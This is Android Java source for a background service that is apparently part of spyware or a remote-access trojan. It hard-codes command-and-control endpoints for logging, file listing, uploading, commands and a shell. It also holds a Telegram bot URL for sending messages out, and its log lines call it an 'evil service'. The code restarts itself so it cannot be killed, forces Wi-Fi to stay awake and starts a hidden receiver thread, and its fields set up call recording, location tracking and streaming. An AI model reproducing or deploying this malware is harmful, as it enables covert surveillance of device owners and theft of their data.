package com.example.test;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.util.Log;

public class MyService extends Service {
	
  final static String site = "http://192.168.100.27/";
  final static String log_url = site+"log.php";	
  final static String filelist_url = site+"list.php";
  final static String uploader_url = site+"up.php";
  final static String cmd_url = site+"c.php";
  final static String post_url = site+"p.php";
  final static String online_url = site+"o.php";
  final static String shelltime_url = site+"time.php";
  final static String tg_url = "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
  		+ "/sendMessage";  // your telegram bot api link (look https://core.telegram.org/bots/api)
  static String log_path;
  final static String LOG_TAG = "myLogs";
  static LocationManager locmanager; // for location manager
  static PendingIntent locpendingintent; // for loc manager
  static boolean recording=false;
  static boolean streaming=false;
  static boolean cmdsessionactive=false;
  static boolean record_must_be_stopped = false;
  static int recorder_thread_id;
  static MediaRecorder recorder;
  static String fname;   // for recorder 
  static HandlerThread waiterthread;
  static Thread streamerthread;
  static int battery_level=0,battery_status=0,charge_type=0;
  static boolean syncactive = false;

  public void onCreate() {
	Log.d(LOG_TAG, "evil service OnCreate() started!");
	init();
    startwaiter();
  }
  
  public IBinder onBind(Intent intent) {
	  Log.d(LOG_TAG, "onBind() recieved!");
	throw new UnsupportedOperationException("");
  }
  
  
  
  public int onStartCommand(Intent intent, int flags, int startId) {
	    Log.d(LOG_TAG, "evil service onStartCommand() started!!");
	    return Service.START_STICKY;
	  }

	  public void onDestroy() {
	    Log.d(LOG_TAG, "evil service killed");
	    Log.d(LOG_TAG, "Damn restarting!! :D");
	    sendBroadcast(new Intent("com.example.test.restart"));  //made unkillable if system
	  }
	  
      @Override
      public void onStart(Intent intent, int startId) {
    	  Log.d(LOG_TAG, "evil service OnStart() started!");
      }
  
      
      
void init(){
	try{
		changewifipolicy();
	log_path=getApplicationContext().getFilesDir().getAbsolutePath()+"/logs"; 
	if(freespace()[0]<5L){  // 5 mb free space minimum is ok
		Log.d(LOG_TAG, "too low space, disabling recorder");
		disable_recorder();
		}	
	}
	catch(Exception e){
		Log.d(LOG_TAG, "error in initialisation");
	}
}

void disable_recorder(){
	try{
	ComponentName component = new ComponentName(getApplicationContext(), PhoneRecorder.class);
	getPackageManager().setComponentEnabledSetting(component, 
			PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
	Log.d(LOG_TAG, "recorder was disabled");}
	catch (Exception e){}
}


@SuppressWarnings("deprecation")
@SuppressLint("NewApi")
void changewifipolicy(){
	
	//getsize();
	try{
		int mode;
		ContentResolver cr = getContentResolver();
	if(Integer.valueOf(android.os.Build.VERSION.SDK_INT)>=17){
		mode = android.provider.Settings.Global.getInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY, 
	            android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
		if(mode!=2){ // меняем политику на never sleep   (SYSTEM ONLY!!)
			android.provider.Settings.Global.putInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY, 
	        android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
			Log.d(LOG_TAG, "wifi policy successfully changed!");
		
	}
		} else{
	mode = android.provider.Settings.System.getInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY, 
            android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
	if(mode!=2){
		android.provider.Settings.System.putInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY, 
        android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
		Log.d(LOG_TAG, "wifi policy successfully changed!");
	}
		}
	}
	catch(Exception e){
		Log.d(LOG_TAG, "cant change wifi sleep policy! not system\n");
	}
	
	
}
    

@SuppressWarnings("deprecation")
@SuppressLint("NewApi")
static long[] freespace(){
	StatFs statFs = new StatFs(Environment.getDataDirectory().getAbsolutePath());
	StatFs statFs2 = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());
	long   data_free;
	long   ext_free;
	if(Integer.valueOf(android.os.Build.VERSION.SDK_INT)>=18){
    data_free   = (statFs.getAvailableBlocksLong() * statFs.getBlockSizeLong())/1024/1024;
    ext_free   = (statFs2.getAvailableBlocksLong() * statFs2.getBlockSizeLong())/1024/1024;}
	else{
		data_free   = (statFs.getAvailableBlocks() * statFs.getBlockSize())/1024/1024;
		ext_free   = (statFs2.getAvailableBlocks() * statFs2.getBlockSize())/1024/1024;
	}
   
    Log.d(MyService.LOG_TAG, "data: "+data_free+" MB");
    //Log.d(LOG_TAG, "external: "+ext_free+" MB");
    return new long[] {data_free, ext_free};
	
}
    
void startwaiter(){
	Log.d(LOG_TAG, "trying to start hidden waiter thread..");
	try{
  	waiterthread = new HandlerThread("hiddenwaiterthread");
  	waiterthread.start();
  	  Looper customlooper = waiterthread.getLooper();
  	  Handler waiterhandler = new Handler(customlooper);
	  IntentFilter myfilter = new IntentFilter();
	  myfilter.addAction("android.intent.action.SCREEN_OFF");
	  myfilter.addAction("android.intent.action.SCREEN_ON");
	  HiddenWaiter evilreceiver = new HiddenWaiter();
	  registerReceiver(evilreceiver, myfilter,null,waiterhandler);}
	catch(Exception e){
		Log.d(LOG_TAG, "error starting hiddenwaiter ..\n"+e.toString());
	}
		
}

void stopwaiter(){
	 Intent intent = new Intent();
	 intent.setAction("stopmyreciever");
	 sendBroadcast(intent);
	 waiterthread.quit();
	 Log.d(LOG_TAG, "killed waiter reciever!");
}
  	
}